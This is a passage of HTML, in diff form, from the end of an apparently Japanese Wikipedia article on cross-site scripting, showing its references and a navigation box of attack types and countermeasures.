+<li><cite class="citation web" id="CITEREFOWASP-Filter-Cheat2016" style="font-style:normal">“<a class="external text" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" rel="nofollow">XSS Filter Evasion Cheat Sheet</a>”.   <a class="external text" href="https://www.owasp.org/index.php/Main_Page" rel="nofollow">OWASP</a> (2016年10月4日). <span title="">2016年10月17日</span>閲覧。</cite></li></ul></li>
+<li>その他
+<ul><li><cite class="citation book" id="CITEREF金床2007" style="font-style:normal">金床『ウェブアプリケーションセキュリティ』<a href="/wiki/%E3%83%87%E3%83%BC%E3%82%BF%E3%83%8F%E3%82%A6%E3%82%B9" title="データハウス">データハウス</a>、2007年7月21日。<style data-mw-deduplicate="TemplateStyles:r2293413">/*
+スタイルシート[[:モジュール:Citation/CS1/styles.css]] (rev 2293413) の処理でエラーが発生しました：• 29行目14文字目のプロパティ⧼code⧽background⧼/code⧽に、不正またはサポートされていない値が指定されています。
+• 38行目14文字目のプロパティ⧼code⧽background⧼/code⧽に、不正またはサポートされていない値が指定されています。
+• 45行目14文字目のプロパティ⧼code⧽background⧼/code⧽に、不正またはサポートされていない値が指定されています。
+• 66行目14文字目のプロパティ⧼code⧽background⧼/code⧽に、不正またはサポートされていない値が指定されています。
+*/
+.mw-parser-output cite.citation{font-style:inherit}.mw-parser-output .citation q{quotes:"\"""\"""'""'"}.mw-parser-output .id-lock-free a,.mw-parser-output .citation .cs1-lock-free a{}.mw-parser-output .id-lock-limited a,.mw-parser-output .id-lock-registration a,.mw-parser-output .citation .cs1-lock-limited a,.mw-parser-output .citation .cs1-lock-registration a{}.mw-parser-output .id-lock-subscription a,.mw-parser-output .citation .cs1-lock-subscription a{}.mw-parser-output .cs1-subscription,.mw-parser-output .cs1-registration{color:#555}.mw-parser-output .cs1-subscription span,.mw-parser-output .cs1-registration span{border-bottom:1px dotted;cursor:help}.mw-parser-output .cs1-ws-icon a{}.mw-parser-output code.cs1-code{color:inherit;background:inherit;border:none;padding:inherit}.mw-parser-output .cs1-hidden-error{display:none;font-size:100%}.mw-parser-output .cs1-visible-error{font-size:100%}.mw-parser-output .cs1-maint{display:none;color:#33aa33;margin-left:0.3em}.mw-parser-output .cs1-format{font-size:95%}.mw-parser-output .cs1-kern-left,.mw-parser-output .cs1-kern-wl-left{padding-left:0.2em}.mw-parser-output .cs1-kern-right,.mw-parser-output .cs1-kern-wl-right{padding-right:0.2em}.mw-parser-output .citation .mw-selflink{font-weight:inherit}</style><a href="/wiki/ISBN" title="ISBN">ISBN</a> <a href="/wiki/%E7%89%B9%E5%88%A5:%E6%96%87%E7%8C%AE%E8%B3%87%E6%96%99/978-4887189409" title="特別:文献資料/978-4887189409">978-4887189409</a>。</cite></li>
+<li><cite class="citation book" id="CITEREF徳丸2011" style="font-style:normal">徳丸浩『体系的に学ぶ 安全なWebアプリケーションの作り方 脆弱性が生まれる原理と対策の実践』SBクリエイティブ、2011年3月1日。<link href="mw-data:TemplateStyles:r2293413" rel="mw-deduplicated-inline-style"/><a href="/wiki/ISBN" title="ISBN">ISBN</a> <a href="/wiki/%E7%89%B9%E5%88%A5:%E6%96%87%E7%8C%AE%E8%B3%87%E6%96%99/978-4797361193" title="特別:文献資料/978-4797361193">978-4797361193</a>。</cite></li>
+<li><a class="external text" href="http://www.slideshare.net/ockeghem/xssreintroduction" rel="nofollow">徳丸浩 - XSS再入門</a></li>
+<li><a class="external text" href="http://www.atmarkit.co.jp/ait/kw/cross_site_scripting_taisakukihon.html" rel="nofollow">@IT - クロスサイトスクリプティング対策の基本</a></li></ul></li></ul>
+<div aria-labelledby="脆弱性、攻撃手法、エクスプロイト" class="navbox" style="border-collapse:collapse;padding:3px"><table class="nowraplinks mw-collapsible autocollapse navbox-inner" style="background:transparent;color:inherit;min-width:100%;border-spacing:0px;border-collapse:separate"><tbody><tr><th class="navbox-title" colspan="2" scope="col"><div style="float:left;width:6em;text-align:left"><div class="noprint plainlinks navbar hlist" style="white-space:nowrap;font-size:60%;font-weight:normal;background-color:transparent;padding:0;color:#000;;border:none;"><ul style="display:inline"><li><span style="font-size:125%;;;border:none;" title="このテンプレートを表示します">表</span></li><li><a class="new" href="/w/index.php?title=%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88%E3%83%BB%E3%83%88%E3%83%BC%E3%82%AF:%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88&amp;action=edit&amp;redlink=1" title="テンプレート・トーク:エクスプロイト (存在しないページ)"><span style="font-size:125%;color:#002bb8;;;border:none;" title="このテンプレートのノートを表示します">話</span></a></li><li><a class="external text" href="http://localhost:8080/w/index.php?title=%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88%3A%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88&amp;action=edit" rel="nofollow"><span style="font-size:125%;color:#002bb8;;;border:none;" title="このテンプレートを編集します。保存の前にプレビューを忘れずに。">編</span></a></li><li><a class="external text" href="http://localhost:8080/w/index.php?title=%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88%3A%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88&amp;action=history" rel="nofollow"><span style="font-size:125%;color:#002bb8;;;border:none;" title="このテンプレートの過去の版を表示します">歴</span></a></li></ul></div></div><div id="脆弱性、攻撃手法、エクスプロイト" style="font-size:110%;margin:0 6em">脆弱性、攻撃手法、<a href="/wiki/%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88" title="エクスプロイト">エクスプロイト</a></div></th></tr><tr><th class="navbox-group" scope="row" style="width:1%">クロスサイト攻撃</th><td class="navbox-list navbox-odd hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B8%E3%82%A7%E3%83%AA" title="クロスサイトリクエストフォージェリ">クロスサイトリクエストフォージェリ</a> (CSRF)</li>
+<li><a class="mw-selflink selflink">クロスサイトスクリプティング</a> (XSS)</li>
+<li><a href="/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%BB%E3%82%AF%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0" title="クロスサイト・クッキング">クロスサイト・クッキング</a></li>
+<li><a href="/wiki/%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%B5%E3%82%A4%E3%83%88%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%B3%E3%82%B0" title="クロスサイトトレーシング">クロスサイトトレーシング</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%AF%E3%83%AD%E3%82%B9%E3%82%BE%E3%83%BC%E3%83%B3%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="クロスゾーンスクリプティング (存在しないページ)">クロスゾーンスクリプティング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Cross-zone_scripting&amp;action=edit&amp;redlink=1" title="En:Cross-zone scripting (存在しないページ)">英語版</a>）</span></span></li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">インジェクション攻撃 (CWE-74)</th><td class="navbox-list navbox-even hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a class="mw-selflink selflink">クロスサイトスクリプティング</a> (XSS) (CWE-79)</li>
+<li><a href="/wiki/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3" title="SQLインジェクション">SQLインジェクション</a> (CWE-89)</li>
+<li><a href="/wiki/HTTP%E3%83%98%E3%83%83%E3%83%80%E3%83%BB%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3" title="HTTPヘッダ・インジェクション">HTTPヘッダ・インジェクション</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=HTTP%E3%83%AC%E3%82%B9%E3%83%9D%E3%83%B3%E3%82%B9%E3%82%B9%E3%83%97%E3%83%AA%E3%83%83%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="HTTPレスポンススプリッティング (存在しないページ)">HTTPレスポンススプリッティング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:HTTP_response_splitting&amp;action=edit&amp;redlink=1" title="En:HTTP response splitting (存在しないページ)">英語版</a>）</span></span> (CWE-113)</li>
+<li><a href="/wiki/%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E5%88%97%E6%94%BB%E6%92%83" title="書式文字列攻撃">書式文字列攻撃</a> (CWE-134)</li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">スプーフィング攻撃</th><td class="navbox-list navbox-odd hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/DNS%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0" title="DNSスプーフィング">DNSスプーフィング</a></li>
+<li><a href="/wiki/IP%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0" title="IPスプーフィング">IPスプーフィング</a></li>
+<li><a href="/wiki/ARP%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0" title="ARPスプーフィング">ARPスプーフィング</a></li>
+<li><a href="/wiki/%E3%82%AF%E3%83%AA%E3%83%83%E3%82%AF%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0" title="クリックジャッキング">クリックジャッキング</a> (CAPEC-103)</li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%83%AA%E3%83%95%E3%82%A1%E3%83%A9%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="リファラスプーフィング (存在しないページ)">リファラスプーフィング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Referer_spoofing&amp;action=edit&amp;redlink=1" title="En:Referer spoofing (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=E%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%B9%E3%83%97%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="Eメールスプーフィング (存在しないページ)">Eメールスプーフィング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Email_spoofing&amp;action=edit&amp;redlink=1" title="En:Email spoofing (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/%E3%83%95%E3%82%A3%E3%83%83%E3%82%B7%E3%83%B3%E3%82%B0_(%E8%A9%90%E6%AC%BA)" title="フィッシング (詐欺)">フィッシング</a> (CAPEC-98)</li>
+<li><a href="/wiki/%E3%83%95%E3%82%A1%E3%83%BC%E3%83%9F%E3%83%B3%E3%82%B0" title="ファーミング">ファーミング</a> (CAPEC-89)</li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">セッションハイジャック関連</th><td class="navbox-list navbox-even hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%8F%E3%82%A4%E3%82%B8%E3%83%A3%E3%83%83%E3%82%AF#セッションID固定化攻撃" title="セッションハイジャック">セッションフィクセーション</a> (CWE-384, CAPEC-61)</li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%9D%E3%82%A4%E3%82%BA%E3%83%8B%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="セッションポイズニング (存在しないページ)">セッションポイズニング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Session_poisoning&amp;action=edit&amp;redlink=1" title="En:Session poisoning (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/TCP%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9%E7%95%AA%E5%8F%B7%E4%BA%88%E6%B8%AC%E6%94%BB%E6%92%83" title="TCPシーケンス番号予測攻撃">TCPシーケンス番号予測攻撃</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E3%83%A2%E3%83%B3%E3%82%B9%E3%82%BF%E3%83%BC%E6%94%BB%E6%92%83&amp;action=edit&amp;redlink=1" title="クッキーモンスター攻撃 (存在しないページ)">クッキーモンスター攻撃</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Cookiemonster_attack&amp;action=edit&amp;redlink=1" title="En:Cookiemonster attack (存在しないページ)">英語版</a>）</span></span></li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">DoS攻撃</th><td class="navbox-list navbox-odd hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/Land%E6%94%BB%E6%92%83" title="Land攻撃">Land攻撃</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%AF%E3%83%AA%E3%82%A2%E3%83%81%E3%83%A3%E3%83%8D%E3%83%AB%E8%A9%95%E4%BE%A1%E6%94%BB%E6%92%83&amp;action=edit&amp;redlink=1" title="クリアチャネル評価攻撃 (存在しないページ)">クリアチャネル評価攻撃</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Clear_channel_assessment_attack&amp;action=edit&amp;redlink=1" title="En:Clear channel assessment attack (存在しないページ)">英語版</a>）</span></span></li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">サイドチャネル攻撃</th><td class="navbox-list navbox-even hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%89%E3%83%96%E3%83%BC%E3%83%88%E6%94%BB%E6%92%83&amp;action=edit&amp;redlink=1" title="コールドブート攻撃 (存在しないページ)">コールドブート攻撃</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Cold_boot_attack&amp;action=edit&amp;redlink=1" title="En:Cold boot attack (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/Meltdown" title="Meltdown">Meltdown</a></li>
+<li><a href="/wiki/Spectre" title="Spectre">Spectre</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=Lazy_FP_state_restore&amp;action=edit&amp;redlink=1" title="Lazy FP state restore (存在しないページ)">Lazy FP state restore</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Lazy_FP_state_restore&amp;action=edit&amp;redlink=1" title="En:Lazy FP state restore (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=TLBleed&amp;action=edit&amp;redlink=1" title="TLBleed (存在しないページ)">TLBleed</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:TLBleed&amp;action=edit&amp;redlink=1" title="En:TLBleed (存在しないページ)">英語版</a>）</span></span></li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">不適切な入力確認 (CWE-20)</th><td class="navbox-list navbox-odd hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/%E3%83%90%E3%83%83%E3%83%95%E3%82%A1%E3%82%AA%E3%83%BC%E3%83%90%E3%83%BC%E3%83%A9%E3%83%B3" title="バッファオーバーラン">バッファオーバーラン</a> (CWE-119、120、121等)</li>
+<li><a href="/wiki/Return-to-libc%E6%94%BB%E6%92%83" title="Return-to-libc攻撃">Return-to-libc攻撃</a></li>
+<li><a href="/wiki/%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%83%88%E3%83%A9%E3%83%90%E3%83%BC%E3%82%B5%E3%83%AB" title="ディレクトリトラバーサル">ディレクトリトラバーサル</a> (CWE-22)</li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">未分類</th><td class="navbox-list navbox-even hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/%E4%B8%AD%E9%96%93%E8%80%85%E6%94%BB%E6%92%83" title="中間者攻撃">中間者攻撃</a> (CAPEC-94)</li>
+<li><a href="/wiki/%E3%83%9E%E3%83%B3%E3%83%BB%E3%82%A4%E3%83%B3%E3%83%BB%E3%82%B6%E3%83%BB%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6" title="マン・イン・ザ・ブラウザ">MITB攻撃</a></li>
+<li><a href="/wiki/Off-by-one%E3%82%A8%E3%83%A9%E3%83%BC" title="Off-by-oneエラー">Off-by-oneエラー</a> (CWE-193)</li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%A4%E3%83%B3%E3%82%AF%E3%83%AB%E3%83%BC%E3%83%89%E8%84%86%E5%BC%B1%E6%80%A7&amp;action=edit&amp;redlink=1" title="ファイルインクルード脆弱性 (存在しないページ)">ファイルインクルード脆弱性</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:File_inclusion_vulnerability&amp;action=edit&amp;redlink=1" title="En:File inclusion vulnerability (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=Mass_Assignment%E8%84%86%E5%BC%B1%E6%80%A7&amp;action=edit&amp;redlink=1" title="Mass Assignment脆弱性 (存在しないページ)">Mass Assignment脆弱性</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Mass_assignment_vulnerability&amp;action=edit&amp;redlink=1" title="En:Mass assignment vulnerability (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%83%80%E3%83%B3%E3%82%B0%E3%83%AA%E3%83%B3%E3%82%B0%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF&amp;action=edit&amp;redlink=1" title="ダングリングポインタ (存在しないページ)">ダングリングポインタ</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Dangling_pointer&amp;action=edit&amp;redlink=1" title="En:Dangling pointer (存在しないページ)">英語版</a>）</span></span></li>
+<li><a class="mw-redirect" href="/wiki/DNS%E3%83%AA%E3%83%90%E3%82%A4%E3%83%B3%E3%83%87%E3%82%A3%E3%83%B3%E3%82%B0" title="DNSリバインディング">DNSリバインディング</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=In-session%E3%83%95%E3%82%A3%E3%83%83%E3%82%B7%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="In-sessionフィッシング (存在しないページ)">in-sessionフィッシング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:In-session_phishing&amp;action=edit&amp;redlink=1" title="En:In-session phishing (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%AF%E3%83%83%E3%82%AD%E3%83%BC%E3%82%B9%E3%82%BF%E3%83%83%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="クッキースタッフィング (存在しないページ)">クッキースタッフィング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Cookie_stuffing&amp;action=edit&amp;redlink=1" title="En:Cookie stuffing (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E6%82%AA%E9%AD%94%E3%81%AE%E5%8F%8C%E5%AD%90%E6%94%BB%E6%92%83&amp;action=edit&amp;redlink=1" title="悪魔の双子攻撃 (存在しないページ)">悪魔の双子攻撃</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Evil_twin_(wireless_networks)&amp;action=edit&amp;redlink=1" title="En:Evil twin (wireless networks) (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/%E3%83%9B%E3%83%A2%E3%82%B0%E3%83%A9%E3%83%95%E6%94%BB%E6%92%83" title="ホモグラフ攻撃">IDNホモグラフ攻撃</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%B9%E3%83%8A%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="スナーフィング (存在しないページ)">スナーフィング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Snarfing&amp;action=edit&amp;redlink=1" title="En:Snarfing (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=JIT%E3%82%B9%E3%83%97%E3%83%AC%E3%83%BC%E3%82%A4%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="JITスプレーイング (存在しないページ)">JITスプレーイング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:JIT_spraying&amp;action=edit&amp;redlink=1" title="En:JIT spraying (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/%E5%8F%8D%E5%B0%84%E6%94%BB%E6%92%83" title="反射攻撃">リプレイ攻撃</a></li>
+<li><a href="/wiki/%E8%AA%95%E7%94%9F%E6%97%A5%E6%94%BB%E6%92%83" title="誕生日攻撃">誕生日攻撃</a></li>
+<li><a class="mw-redirect" href="/wiki/CRIME" title="CRIME">CRIME</a></li>
+<li><a href="/wiki/KRACK" title="KRACK">KRACK</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=Intel_ME&amp;action=edit&amp;redlink=1" title="Intel ME (存在しないページ)">Intel ME</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Intel_Management_Engine&amp;action=edit&amp;redlink=1" title="En:Intel Management Engine (存在しないページ)">英語版</a>）</span></span>の脆弱性</li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">対策</th><td class="navbox-list navbox-odd hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/Outbound_Port_25_Blocking" title="Outbound Port 25 Blocking">OP25B</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=Content_Security_Policy&amp;action=edit&amp;redlink=1" title="Content Security Policy (存在しないページ)">Content Security Policy</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Content_Security_Policy&amp;action=edit&amp;redlink=1" title="En:Content Security Policy (存在しないページ)">英語版</a>）</span></span></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%88%E3%82%B9%E3%83%8B%E3%83%83%E3%83%95%E3%82%A3%E3%83%B3%E3%82%B0&amp;action=edit&amp;redlink=1" title="コンテントスニッフィング (存在しないページ)">コンテントスニッフィング</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Content_sniffing&amp;action=edit&amp;redlink=1" title="En:Content sniffing (存在しないページ)">英語版</a>）</span></span></li>
+<li><a href="/wiki/HTTP_Strict_Transport_Security" title="HTTP Strict Transport Security">HTTP Strict Transport Security</a> (HSTS)</li>
+<li><a href="/wiki/%E3%83%95%E3%82%A1%E3%82%A4%E3%82%A2%E3%82%A6%E3%82%A9%E3%83%BC%E3%83%AB" title="ファイアウォール">ファイアウォール</a></li>
+<li><a class="mw-redirect" href="/wiki/%E4%BE%B5%E5%85%A5%E9%98%B2%E6%AD%A2%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0" title="侵入防止システム">侵入防止システム</a> (IPS)</li>
+<li><a href="/wiki/%E4%BE%B5%E5%85%A5%E6%A4%9C%E7%9F%A5%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0" title="侵入検知システム">侵入検知システム</a> (IDS)</li>
+<li><a href="/wiki/Web_Application_Firewall" title="Web Application Firewall">Web Application Firewall</a> (WAF)</li>
+<li><a href="/wiki/Wi-Fi_Protected_Access" title="Wi-Fi Protected Access">Wi-Fi Protected Access</a></li></ul>
+</div></td></tr><tr><th class="navbox-group" scope="row" style="width:1%">関連項目</th><td class="navbox-list navbox-even hlist hlist-pipe" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"><div style="padding:0em 0.25em">
+<ul><li><a href="/wiki/%E3%83%9E%E3%83%AB%E3%82%A6%E3%82%A7%E3%82%A2" title="マルウェア">マルウェア</a></li>
+<li><a href="/wiki/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%9B%E3%83%BC%E3%83%AB" title="セキュリティホール">セキュリティホール</a></li>
+<li><a href="/wiki/%E3%82%AF%E3%83%A9%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0_(%E3%82%B3%E3%83%B3%E3%83%94%E3%83%A5%E3%83%BC%E3%82%BF)" title="クラッキング (コンピュータ)">クラッキング</a></li>
+<li><a href="/wiki/%E8%84%86%E5%BC%B1%E6%80%A7%E6%83%85%E5%A0%B1%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9" title="脆弱性情報データベース">脆弱性情報データベース</a></li>
+<li><a href="/wiki/%E3%83%96%E3%83%A9%E3%82%A6%E3%82%B6%E3%82%AF%E3%83%A9%E3%83%83%E3%82%B7%E3%83%A3%E3%83%BC" title="ブラウザクラッシャー">ブラウザクラッシャー</a></li>
+<li><a href="/wiki/%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89" title="シェルコード">シェルコード</a></li>
+<li><a href="/wiki/Metasploit" title="Metasploit">Metasploit</a></li>
+<li><a href="/wiki/Sshnuke" title="Sshnuke">Sshnuke</a></li>
+<li><span title="リンク先の項目はまだありません。新規の執筆や他言語版からの翻訳が望まれます。"><a class="new" href="/w/index.php?title=Nikto_Web_Scanner&amp;action=edit&amp;redlink=1" title="Nikto Web Scanner (存在しないページ)">Nikto Web Scanner</a><span class="noprint" style="font-size: 0.77em; font-weight: normal;">（<a class="new" href="/w/index.php?title=En:Nikto_Web_Scanner&amp;action=edit&amp;redlink=1" title="En:Nikto Web Scanner (存在しないページ)">英語版</a>）</span></span></li>
